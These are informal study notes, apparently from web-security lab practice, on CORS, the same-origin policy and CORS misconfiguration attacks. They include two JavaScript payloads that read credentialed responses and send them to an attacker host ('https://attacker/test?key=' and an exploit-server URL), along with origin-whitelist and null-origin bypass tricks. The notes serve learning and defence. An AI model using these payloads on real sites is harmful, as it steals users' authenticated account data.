Cross-origin resource sharing(CORS) is a browser mechanism which enables contolled access to resources located outside a given domain

Same-origin policy aims to prevent websites from attacking each other.

when a browser sends an HTTP request from on origin to another, any cookies, aincluding authentication session cookies, relevant to the other domain are also send as part of the request. This means that the reponse will be generated within the user's session, and include any relevant datat that is specific to a user

if youre in www.test.com, you can run a script to access www.another.com

Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://www.google.com/my.policy. (Reason: CORS header ‘Access-Control-Allow-Origin’ missing).

The same origin policy generally controls the access that js code has to content that is loaded cross-domain, cross origin loading of page resources is generally permitted, but while the external resources can be loaded by the page, any js on the page wont be able to read the contents of these resources

Many websites interact with subdomains or third-party sites in a way that requires full cross origin access,

A controlled relaxation of same-origin policy is possible using cross-origin resource sharing

it defines trusted web origins and associated properties such as whether authenticated access is permitted

when a site make a cross domain request, the response should return with
Access-Control-Allow-Origin : https://letthissitegetresponse

only then the code will get access to that resource

Access-Control-Allow-Credentials: true
can be set to make the code access authentication based cookies too

Cors congiguration issues:

reading the origin header and including a response header wiht
Access-control-allow-rigin: url taken from the orgin header

"
var xhr = new XMLHttpRequest();
xhr = onload = reqListener();
xhr.open('get', 'https://vulnerable-site/getinfo',true);
xhr.withCredentials = true;
xhr.send();

function reqListener() {
	location = 'https://attacker/test?key=' + this.responseText;
};
"

some of the site whitle list the origin sites, which might grep for the site starts with certian name or has certain name, which can bypassed by registering that domain with certain constrains

allow --> normalsite.com
spoofed --> hackernormalsite.com or normalsite.com.hacker.net

origin: null can also used to get information

attacker can use iframe sandbox feature to make null origin request thus bypassing the whitelist

If a website trusts an origin that is vulnerable to xss then an attaker could exploit the xss to inject some js that retreve sensitive data

'
<script>
location = "http://stock.acec1f6b1eb70a8880581790001000f2.web-security-academy.net/?productId=%3Cscript%3Evar+xhr+%3d+new+XMLHttpRequest()%3bxhr.onload+%3d+reqListener%3bxhr.open(%22GET%22,%22https%3a//acec1f6b1eb70a8880581790001000f2.web-security-academy.net/accountDetails%22,%22true%22)%3bxhr.withCredentials+%3d+true%3bxhr.send()%3bfunction+reqListener()+{location+%3d+%22https%3a//ac291f091e650a8c80ce17a401f400c2.web-security-academy.net/%3fkey%3d%22%2bthis.responseText%3b}%3C/script%3E&storeId=1";
</script>
'

if users within the private ip address space acces the public internet then a cors based attack can be performed from the external site that uses that victim's broweser as a proxy for access intranet resources


